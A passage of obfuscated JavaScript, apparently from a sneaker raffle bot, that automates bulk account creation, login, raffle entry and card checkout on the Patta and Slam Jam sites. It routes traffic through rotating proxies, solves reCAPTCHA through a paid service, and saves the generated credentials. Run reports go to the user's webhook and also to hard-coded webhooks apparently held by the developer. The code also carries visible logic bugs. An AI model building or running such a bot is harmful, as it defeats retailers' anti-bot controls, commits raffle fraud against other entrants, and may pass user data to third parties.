        if (_0x4d27e3[_0x488c6d]['Email'] == '' || _0x4d27e3[_0x488c6d]['FirstName'] == '' || _0x4d27e3[_0x488c6d]['LastName'] == '') {
            console['log'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x488c6d + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x5df609(0x7d0);
            continue;
        }
        (_0x4d27e3[_0x488c6d]['Password'] == '' || _0x4d27e3[_0x488c6d] == undefined) && _0x4d27e3[_0x488c6d]['Password'] == 'JRaffles23!';
        if (_0x26509c['useRandomProxy'] = ![])
            var _0x28677b = _0x236f5b[_0x488c6d]['split'](':');
        else
            var _0x3a2394 = Math['round'](Math['random']() * (_0x236f5b['length'] - 0x1)), _0x28677b = _0x236f5b[_0x3a2394]['split'](':');
        const _0x3cb7be = await _0x2d6840['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x28677b[0x0] + ':' + _0x28677b[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x323fb0 = await _0x3cb7be['newPage']();
            await _0x323fb0['authenticate']({
                'username': '' + _0x28677b[0x2],
                'password': '' + _0x28677b[0x3]
            }), console['log'](_0x4db3b7() + '\x20[' + _0x59e809['name'] + ']\x20Task\x20' + (_0x488c6d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x323fb0['setRequestInterception'](!![]), _0x323fb0['on']('request', _0x5bd535 => {
                _0x5bd535['resourceType']() === 'image' || _0x5bd535['resourceType']() === 'font' || _0x5bd535['resourceType']() === 'media' ? _0x5bd535['abort']() : _0x5bd535['continue']();
            }), await _0x323fb0['goto'](_0x30d317), await _0x5df609(0xbb8), await _0x323fb0['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x4db3b7() + '\x20[' + _0x59e809['name'] + ']\x20Task\x20' + (_0x488c6d + 0x1) + '\x20:\x20Filling\x20information'), await _0x323fb0['type']('#RegisterForm-FirstName', '' + _0x4d27e3[_0x488c6d]['FirstName']), await _0x5df609(0x226), await _0x323fb0['type']('#RegisterForm-LastName', '' + _0x4d27e3[_0x488c6d]['LastName']), await _0x5df609(0x226), await _0x323fb0['type']('#RegisterForm-email', '' + _0x4d27e3[_0x488c6d]['Email']), await _0x5df609(0x226), await _0x323fb0['type']('#RegisterForm-password', '' + _0x4d27e3[_0x488c6d]['Password']), await _0x5df609(0x226), console['log'](_0x4db3b7() + '\x20[' + _0x59e809['name'] + ']\x20Task\x20' + (_0x488c6d + 0x1) + '\x20:\x20Submitting..'), await _0x323fb0['$eval']('#RegisterForm', _0x1773da => _0x1773da['submit']()), await _0x5df609(0x1f40);
            try {
                await _0x323fb0['waitForSelector']('.home-page-grid__collection'), await _0x5df609(0x1f4), console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x59e809['name'] + ']\x20Task\x20' + (_0x488c6d + 0x1) + '\x20:\x20Account\x20' + _0x4d27e3[_0x488c6d]['Email'] + '\x20Generated!')), _0x2c62e3['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x4d27e3[_0x488c6d]['Email'] + ',' + _0x4d27e3[_0x488c6d]['Password']), console['log'](_0x1ee4d0['yellow'](_0x4db3b7() + '\x20[' + _0x59e809['name'] + ']\x20Task\x20' + (_0x488c6d + 0x1) + '\x20:\x20Account\x20' + _0x4d27e3[_0x488c6d]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                try {
                    _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x529ffa['succesDEVMSG']);
                } catch {
                }
                await _0x2ebaaf(_0x130765, _0x529ffa['succesDEVMSG']);
            } catch (_0x33db83) {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x488c6d + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x33db83));
            }
        } catch (_0x5ea7fc) {
            console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x488c6d + 0x1) + '\x20:\x20' + _0x5ea7fc));
        } finally {
            _0x3cb7be && _0x3cb7be['close'](), console['log']('Waiting\x20for\x20' + _0x26509c['delay'] + '\x20ms'), await _0x5df609(_0x26509c['delay']);
        }
    }
}
async function _0x243f6f(_0x3c7bfd, _0x45b335, _0x149628, _0x11c6ff) {
    _0x2d6840['use'](_0x4c8616()), _0x2d6840['use'](_0x2e9f9f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x26509c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x364eb7 = 0x0; _0x364eb7 < _0x149628['length']; _0x364eb7++) {
        var _0x672f6e, _0x3a2cc7 = '', _0x1c9a20 = 0x0;
        _0x2be893(_0x45b335['name'] + '\x20Task\x20' + (_0x364eb7 + 0x1) + '\x20/\x20' + _0x149628['length'] + '\x20||\x20File:\x20' + _0x21572d + '\x20Proxies:\x20' + _0x246cb8), await _0x5a7b4a(_0x149628, _0x364eb7);
        if (_0x149628[_0x364eb7]['Email'] == '' || _0x149628[_0x364eb7]['Password'] == '' || _0x149628[_0x364eb7]['FirstName'] == '' || _0x149628[_0x364eb7]['LastName'] == '') {
            console['log'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x364eb7 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x26509c['useRandomProxy'] = ![])
            var _0x2bda6a = _0x11c6ff[_0x364eb7]['split'](':');
        else
            var _0x11cdf7 = Math['round'](Math['random']() * (_0x11c6ff['length'] - 0x1)), _0x2bda6a = _0x11c6ff[_0x11cdf7]['split'](':');
        const _0x123395 = await _0x2d6840['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2bda6a[0x0] + ':' + _0x2bda6a[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x5c688f = await _0x123395['newPage']();
            await _0x5c688f['authenticate']({
                'username': '' + _0x2bda6a[0x2],
                'password': '' + _0x2bda6a[0x3]
            }), console['log'](_0x4db3b7() + '\x20[' + _0x45b335['name'] + ']\x20Task\x20' + (_0x364eb7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5c688f['setRequestInterception'](!![]), _0x5c688f['on']('request', _0x4b342d => {
                _0x4b342d['resourceType']() === 'image' || _0x4b342d['resourceType']() === 'font' || _0x4b342d['resourceType']() === 'media' ? _0x4b342d['abort']() : _0x4b342d['continue']();
            }), await _0x5c688f['goto']('https://www.patta.nl/nl/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x5c688f['waitForSelector']('#CustomerEmail'), console['log'](_0x4db3b7() + '\x20[' + _0x45b335['name'] + ']\x20Task\x20' + (_0x364eb7 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x5c688f['type']('#CustomerEmail', '' + _0x149628[_0x364eb7]['Email']), await _0x5df609(0x12c), await _0x5c688f['type']('#CustomerPassword', '' + _0x149628[_0x364eb7]['Password']), await _0x5df609(0x226), await _0x5c688f['$eval']('#customer_login', _0x57e78c => _0x57e78c['submit']());
            try {
                await _0x5c688f['waitForSelector']('#orders'), await _0x5df609(0x4b0);
            } catch {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x45b335['name'] + ']\x20Task\x20' + (_0x364eb7 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x5c688f['goto']('' + _0x149628[_0x364eb7]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x5df609(0xbb8), console['log'](_0x4db3b7() + '\x20[' + _0x45b335['name'] + ']\x20Task\x20' + (_0x364eb7 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x5c688f['waitForSelector']('#email');
            } catch {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x45b335['name'] + ']\x20Task\x20' + (_0x364eb7 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
            }
            await _0x5c688f['type']('#email', '' + _0x149628[_0x364eb7]['Email']), await _0x5df609(0x384), await _0x5c688f['type']('#first_name', '' + _0x149628[_0x364eb7]['FirstName']), await _0x5df609(0x514), await _0x5c688f['type']('#last_name', '' + _0x149628[_0x364eb7]['LastName']), await _0x5df609(0x514), await _0x5c688f['type']('#street_address', _0x149628[_0x364eb7]['Address1'] + '\x20' + _0x149628[_0x364eb7]['HouseNumber'] + '\x20' + _0x149628[_0x364eb7]['Address2']), await _0x5df609(0x2bc);
            _0x149628[_0x364eb7]['Postcode'] == undefined && (_0x149628[_0x364eb7]['Postcode'] = _0x149628[_0x364eb7]['Zip']);
            await _0x5c688f['type']('#zip_code', '' + _0x149628[_0x364eb7]['Postcode']), await _0x5df609(0x320), await _0x5c688f['type']('#city', '' + _0x149628[_0x364eb7]['City']), await _0x5df609(0x320), await _0x5c688f['type']('#bday', '01/01/1994'), await _0x5df609(0x320), await _0x5c688f['type']('#instagram', '' + _0x149628[_0x364eb7]['Follower']), await _0x5df609(0x352);
            if (_0x149628[_0x364eb7]['Size'] == 'RANDOM') {
                const _0x35d7ec = await _0x5c688f['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x3ba445 => {
                    return _0x3ba445['map'](_0xc4f681 => _0xc4f681['textContent']);
                });
                var _0x38daba = Math['round'](Math['random']() * (_0x35d7ec['length'] - 0x1));
                console['log'](_0x4db3b7() + '\x20[' + _0x45b335['name'] + ']\x20Task\x20' + (_0x364eb7 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x35d7ec[_0x38daba]), await _0x5c688f['click']('label[data-eu-size=\x22' + _0x35d7ec[_0x38daba] + '\x22]');
            } else {
                console['log'](_0x4db3b7() + '\x20[' + _0x45b335['name'] + ']\x20Task\x20' + (_0x364eb7 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x149628[_0x364eb7]['Size']);
                try {
                    await _0x5c688f['click']('label[data-eu-size=\x22' + _0x149628[_0x364eb7]['Size'] + '\x22]');
                } catch {
                    await _0x5c688f['click']('label[data-eu-size=\x22' + _0x149628[_0x364eb7]['Size'] + '.0\x22]');
                }
            }
            await _0x5df609(0xbb8), await _0x5c688f['$$eval']('.raffle__checkbox-label', _0x16874d => _0x16874d['forEach'](_0x1adf70 => _0x1adf70['click']())), await _0x5df609(0x7d0), console['log'](_0x4db3b7() + '\x20[' + _0x45b335['name'] + ']\x20Task\x20' + (_0x364eb7 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x5c688f['click']('#raffle__form-submit'), await _0x5df609(0x1388);
            try {
                await _0x5c688f['waitForSelector']('#raffle__confirmation-message-container'), console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x45b335['name'] + ']\x20Task\x20' + (_0x364eb7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x493906) {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x364eb7 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x493906));
            }
        } catch (_0x2bb52c) {
            console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x364eb7 + 0x1) + '\x20:\x20' + _0x2bb52c)), _0x3a2cc7 = 'yes';
        } finally {
            _0x123395 && _0x123395['close']();
            if (_0x3a2cc7 == 'yes' && _0x1c9a20 != 0x5) {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x45b335['name'] + ']\x20Task\x20' + (_0x364eb7 + 0x1) + '\x20:\x20Retrying')), _0x364eb7 = _0x364eb7 - 0x1, _0x1c9a20 = _0x1c9a20 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x26509c['delay'] + '\x20ms'), await _0x5df609(_0x26509c['delay']);
        }
    }
}
async function _0x229917(_0x2953c5, _0x571ea7, _0x5db847, _0xfc6a46) {
    _0x2d6840['use'](_0x4c8616()), _0x2d6840['use'](_0x2e9f9f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x26509c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x6c61d6 = 0x0; _0x6c61d6 < _0x5db847['length']; _0x6c61d6++) {
        var _0x2cab00 = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x136a13
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x26509c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x23a95c
                }
            ]
        }];
        const _0x2b03a1 = { 'embeds': _0x2cab00 };
        _0x2be893(_0x571ea7['name'] + '\x20Task\x20' + (_0x6c61d6 + 0x1) + '\x20/\x20' + _0x5db847['length'] + '\x20||\x20File:\x20' + _0x21572d + '\x20Proxies:\x20' + _0x246cb8), await _0x5a7b4a(_0x5db847, _0x6c61d6);
        var _0x190048 = await _0x4ec2d3(_0x5db847[_0x6c61d6], _0x571ea7, 'acc', ![]);
        const _0x6ecdc9 = { 'succesDEVMSG': { 'embeds': [_0x190048] } };
        if (_0x5db847[_0x6c61d6]['Email'] == '' || _0x5db847[_0x6c61d6]['FirstName'] == '' || _0x5db847[_0x6c61d6]['LastName'] == '') {
            console['log'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x6c61d6 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x5df609(0x7d0);
            continue;
        }
        (_0x5db847[_0x6c61d6]['Password'] == '' || _0x5db847[_0x6c61d6] == undefined) && _0x5db847[_0x6c61d6]['Password'] == 'JRaffles23!';
        if (_0x26509c['useRandomProxy'] = ![])
            var _0x5f0431 = _0xfc6a46[_0x6c61d6]['split'](':');
        else
            var _0x33d3e1 = Math['round'](Math['random']() * (_0xfc6a46['length'] - 0x1)), _0x5f0431 = _0xfc6a46[_0x33d3e1]['split'](':');
        const _0x92acea = await _0x2d6840['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x5f0431[0x0] + ':' + _0x5f0431[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x2c8346 = await _0x92acea['newPage']();
            await _0x2c8346['authenticate']({
                'username': '' + _0x5f0431[0x2],
                'password': '' + _0x5f0431[0x3]
            }), console['log'](_0x4db3b7() + '\x20[' + _0x571ea7['name'] + ']\x20Task\x20' + (_0x6c61d6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2c8346['setRequestInterception'](!![]), _0x2c8346['on']('request', _0x56761f => {
                _0x56761f['resourceType']() === 'image' || _0x56761f['resourceType']() === 'font' || _0x56761f['resourceType']() === 'media' ? _0x56761f['abort']() : _0x56761f['continue']();
            }), await _0x2c8346['goto']('https://drop.slamjam.com/account/register'), await _0x5df609(0xbb8), await _0x2c8346['waitForSelector']('#FirstName'), await _0x2c8346['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2c8346['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x4db3b7() + '\x20[' + _0x571ea7['name'] + ']\x20Task\x20' + (_0x6c61d6 + 0x1) + '\x20:\x20Filling\x20information'), await _0x5df609(0x4b0), await _0x2c8346['type']('#FirstName', '' + _0x5db847[_0x6c61d6]['FirstName']), await _0x5df609(0x226), await _0x2c8346['type']('#LastName', '' + _0x5db847[_0x6c61d6]['LastName']), await _0x5df609(0x226), await _0x2c8346['type']('#Email', '' + _0x5db847[_0x6c61d6]['Email']), await _0x5df609(0x2ee), await _0x2c8346['type']('#ConfirmEmail', '' + _0x5db847[_0x6c61d6]['Email']), await _0x5df609(0x2ee), await _0x2c8346['type']('#CreatePassword', '' + _0x5db847[_0x6c61d6]['Password']), await _0x5df609(0x2ee), await _0x2c8346['type']('#CreateConfirmPassword', '' + _0x5db847[_0x6c61d6]['Password']), await _0x5df609(0x226), console['log'](_0x4db3b7() + '\x20[' + _0x571ea7['name'] + ']\x20Task\x20' + (_0x6c61d6 + 0x1) + '\x20:\x20Submitting..'), await _0x2c8346['$eval']('#create_customer', _0x97f6b7 => _0x97f6b7['submit']()), await _0x5df609(0x1388), console['log'](_0x4db3b7() + '\x20[' + _0x571ea7['name'] + ']\x20Task\x20' + (_0x6c61d6 + 0x1) + '\x20:\x20' + _0x1ee4d0['cyan']('Solving\x20Captcha')), await _0x2c8346['solveRecaptchas'](), console['log'](_0x4db3b7() + '\x20[' + _0x571ea7['name'] + ']\x20Task\x20' + (_0x6c61d6 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x2c8346['$eval']('.shopify-challenge__container\x20>\x20form', _0x105a43 => _0x105a43['submit']());
            try {
                await _0x2c8346['waitForSelector']('.product-card__image'), await _0x5df609(0x1f4), console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x571ea7['name'] + ']\x20Task\x20' + (_0x6c61d6 + 0x1) + '\x20:\x20Account\x20' + _0x5db847[_0x6c61d6]['Email'] + '\x20Generated!')), _0x2c62e3['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x5db847[_0x6c61d6]['Email'] + ',' + _0x5db847[_0x6c61d6]['Password']), console['log'](_0x1ee4d0['yellow'](_0x4db3b7() + '\x20[' + _0x571ea7['name'] + ']\x20Task\x20' + (_0x6c61d6 + 0x1) + '\x20:\x20Account\x20' + _0x5db847[_0x6c61d6]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                try {
                    _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x6ecdc9['succesDEVMSG']);
                } catch {
                }
                await _0x2ebaaf(_0x130765, _0x6ecdc9['succesDEVMSG']);
            } catch (_0x442189) {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x6c61d6 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x442189));
            }
        } catch (_0x58d7bf) {
            console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x6c61d6 + 0x1) + '\x20:\x20' + _0x58d7bf));
        } finally {
            _0x92acea && _0x92acea['close'](), console['log']('Waiting\x20for\x20' + _0x26509c['delay'] + '\x20ms'), await _0x5df609(_0x26509c['delay']);
        }
    }
}
async function _0x568966(_0x1e6894, _0x2763f0, _0x21cac5, _0x1fb8a3) {
    _0x2d6840['use'](_0x4c8616()), _0x2d6840['use'](_0x2e9f9f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x26509c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2a8d16 = 0x0; _0x2a8d16 < _0x21cac5['length']; _0x2a8d16++) {
        var _0x478366, _0x2d25b9 = '', _0x6265ad = 0x0;
        _0x2be893(_0x2763f0['name'] + '\x20Task\x20' + (_0x2a8d16 + 0x1) + '\x20/\x20' + _0x21cac5['length'] + '\x20||\x20File:\x20' + _0x21572d + '\x20Proxies:\x20' + _0x246cb8), await _0x5a7b4a(_0x21cac5, _0x2a8d16);
        if (_0x21cac5[_0x2a8d16]['Email'] == '' || _0x21cac5[_0x2a8d16]['Password'] == '' || _0x21cac5[_0x2a8d16]['FirstName'] == '' || _0x21cac5[_0x2a8d16]['LastName'] == '') {
            console['log'](_0x4db3b7() + '\x20[' + _0x2763f0['name'] + ']\x20Task\x20' + (_0x2a8d16 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x26509c['useRandomProxy'] = ![])
            var _0x5f4f4c = _0x1fb8a3[_0x2a8d16]['split'](':');
        else
            var _0x3a65ab = Math['round'](Math['random']() * (_0x1fb8a3['length'] - 0x1)), _0x5f4f4c = _0x1fb8a3[_0x3a65ab]['split'](':');
        const _0x4e5151 = await _0x2d6840['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x5f4f4c[0x0] + ':' + _0x5f4f4c[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials'
            ]
        });
        try {
            const _0x209153 = await _0x4e5151['newPage']();
            await _0x209153['authenticate']({
                'username': '' + _0x5f4f4c[0x2],
                'password': '' + _0x5f4f4c[0x3]
            }), await _0x209153['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), console['log'](_0x4db3b7() + '\x20[' + _0x2763f0['name'] + ']\x20Task\x20' + (_0x2a8d16 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x209153['setRequestInterception'](!![]), _0x209153['on']('request', _0x2ec1a5 => {
                _0x2ec1a5['resourceType']() === 'image' || _0x2ec1a5['resourceType']() === 'font' || _0x2ec1a5['resourceType']() === 'media' ? _0x2ec1a5['abort']() : _0x2ec1a5['continue']();
            }), await _0x209153['goto']('https://drop.slamjam.com/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x209153['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x209153['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x5df609(0x258), await _0x209153['waitForSelector']('#CustomerEmail'), console['log'](_0x4db3b7() + '\x20[' + _0x2763f0['name'] + ']\x20Task\x20' + (_0x2a8d16 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x209153['type']('#CustomerEmail', '' + _0x21cac5[_0x2a8d16]['Email']), await _0x5df609(0x12c), await _0x209153['type']('#CustomerPassword', '' + _0x21cac5[_0x2a8d16]['Password']), await _0x5df609(0x226), await _0x209153['$eval']('#customer_login', _0x49751e => _0x49751e['submit']()), await _0x5df609(0x7d0), await _0x209153['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x4db3b7() + '\x20[' + _0x2763f0['name'] + ']\x20Task\x20' + (_0x2a8d16 + 0x1) + '\x20:\x20' + _0x1ee4d0['cyan']('Solving\x20Captcha')), await _0x209153['solveRecaptchas'](), console['log'](_0x4db3b7() + '\x20[' + _0x2763f0['name'] + ']\x20Task\x20' + (_0x2a8d16 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x209153['$eval']('.shopify-challenge__container\x20>\x20form', _0x36304c => _0x36304c['submit']());
            try {
                await _0x209153['waitForSelector']('.nav-account'), await _0x5df609(0x4b0);
            } catch {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x2763f0['name'] + ']\x20Task\x20' + (_0x2a8d16 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x209153['goto']('' + _0x21cac5[_0x2a8d16]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x5df609(0xbb8), console['log'](_0x4db3b7() + '\x20[' + _0x2763f0['name'] + ']\x20Task\x20' + (_0x2a8d16 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x209153['waitForSelector']('#ProductSelect-product-template-raffle');
            } catch {
            }
            await _0x209153['click']('.product-select-variant-wrapper'), await _0x5df609(0x320), await _0x209153['click']('li.product-select-variant__value[data-size=\x22' + _0x21cac5[_0x2a8d16]['Size'] + '\x22]'), await _0x5df609(0x384), await _0x209153['$eval']('#AddToCartForm-product-template-raffle', _0x495a83 => _0x495a83['submit']()), await _0x209153['waitForSelector']('.cart-order-summary__content'), await _0x5df609(0x514), await _0x209153['goto']('https://drop.slamjam.com/checkout'), await _0x5df609(0x514), await _0x209153['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x4db3b7() + '\x20[' + _0x2763f0['name'] + ']\x20Task\x20' + (_0x2a8d16 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x209153['select']('#checkout_shipping_address_country', '' + _0x21cac5[_0x2a8d16]['Country']), await _0x5df609(0x200), await _0x209153['waitForSelector']('#checkout_shipping_address_first_name'), await _0x209153['type']('#checkout_shipping_address_first_name', '' + _0x21cac5[_0x2a8d16]['FirstName']), await _0x5df609(0x237), await _0x209153['type']('#checkout_shipping_address_last_name', '' + _0x21cac5[_0x2a8d16]['LastName']), await _0x5df609(0x1e0), await _0x209153['type']('#checkout_shipping_address_address1', _0x21cac5[_0x2a8d16]['Address1'] + '\x20' + _0x21cac5[_0x2a8d16]['HouseNumber']), await _0x5df609(0x514), await _0x209153['type']('#checkout_shipping_address_address2', '' + _0x21cac5[_0x2a8d16]['Address2']), await _0x5df609(0x514);
            _0x21cac5[_0x2a8d16]['Postcode'] == undefined && (_0x21cac5[_0x2a8d16]['Postcode'] = _0x21cac5[_0x2a8d16]['Zip']);
            await _0x209153['type']('#checkout_shipping_address_zip', '' + _0x21cac5[_0x2a8d16]['Postcode']), await _0x5df609(0x2bc), await _0x209153['type']('#checkout_shipping_address_city', '' + _0x21cac5[_0x2a8d16]['City']), await _0x5df609(0x320), await _0x209153['type']('#checkout_shipping_address_phone', '' + _0x21cac5[_0x2a8d16]['Phone']), await _0x5df609(0x320), await _0x209153['click']('#continue_button'), await _0x5df609(0xbb8), await _0x209153['waitForSelector']('.summary-title'), await _0x5df609(0x320), await _0x209153['click']('#continue_button'), await _0x5df609(0x320), console['log'](_0x4db3b7() + '\x20[' + _0x2763f0['name'] + ']\x20Task\x20' + (_0x2a8d16 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x209153['waitForSelector']('#checkout_credit_card_vault'), await _0x5df609(0x3e8);
            var _0x541295 = await _0x209153['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x37aafc = await _0x541295['contentFrame']();
            await _0x37aafc['click']('#number'), await _0x5df609(0x3e8), await _0x37aafc['type']('#number', '' + _0x21cac5[_0x2a8d16]['CardNumber'], { 'delay': 0x78 }), _0x541295 = await _0x209153['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x37aafc = await _0x541295['contentFrame'](), await _0x5df609(0x1c2), await _0x37aafc['click']('#name'), await _0x5df609(0x1f4), await _0x37aafc['type']('#name', '' + _0x21cac5[_0x2a8d16]['NameOnCard'], { 'delay': 0x78 }), _0x541295 = await _0x209153['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x37aafc = await _0x541295['contentFrame'](), await _0x5df609(0x1c2), await _0x37aafc['click']('#expiry'), await _0x5df609(0x1f4), await _0x37aafc['type']('#expiry', '' + _0x21cac5[_0x2a8d16]['ExpiryDate'], { 'delay': 0x78 }), _0x541295 = await _0x209153['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x37aafc = await _0x541295['contentFrame'](), await _0x5df609(0x1c2), await _0x37aafc['click']('#verification_value'), await _0x5df609(0x1f4), await _0x37aafc['type']('#verification_value', '' + _0x21cac5[_0x2a8d16]['CVV'], { 'delay': 0x78 }), await _0x209153['$eval']('#accepts-flag-raffle', _0x9ec448 => _0x9ec448['click']()), await _0x5df609(0x7d0), console['log'](_0x4db3b7() + '\x20[' + _0x2763f0['name'] + ']\x20Task\x20' + (_0x2a8d16 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x209153['$eval']('#continue_button', _0x170e30 => _0x170e30['click']()), await _0x5df609(0x1b58), await _0x209153['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x209153['$eval']('.edit_checkout.animate-floating-labels', _0x43222b => _0x43222b['submit']()), await _0x5df609(0x7d0);
            try {
                await _0x209153['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x2763f0['name'] + ']\x20Task\x20' + (_0x2a8d16 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x5799f7) {
                throw new Error('Error\x20Processing\x20Order:\x20' + _0x5799f7['message']);
            }
            var _0x25a895 = await _0x4ec2d3(_0x21cac5[_0x2a8d16], _0x2763f0, 'dev', ![]), _0x50cf6b = await _0x4ec2d3(_0x21cac5[_0x2a8d16], _0x2763f0, 'pub', ![]);
            const _0x3af41e = {
                'succesDEVMSG': { 'embeds': [_0x25a895] },
                'succesPUBMSG': { 'embeds': [_0x50cf6b] }
            };
            try {
                _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x3af41e['succesDEVMSG']), await _0x5df609(0xc8), await _0x2ebaaf(_0xa7232c, _0x3af41e['succesDEVMSG']), await _0x5df609(0xc8), await _0x2ebaaf(_0x19c58b, _0x3af41e['succesPUBMSG']);
            } catch (_0x448fb1) {
                console['log'](_0x1ee4d0['yellow'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x2a8d16 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x448fb1));
            }
        } catch (_0x3735dc) {
            console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x2a8d16 + 0x1) + '\x20:\x20' + _0x3735dc)), _0x478366 = '' + _0x3735dc;
            var _0x4ba6f0 = await _0x4ec2d3(kickz[_0x2a8d16], _0x2763f0, 'dev', !![], _0x478366);
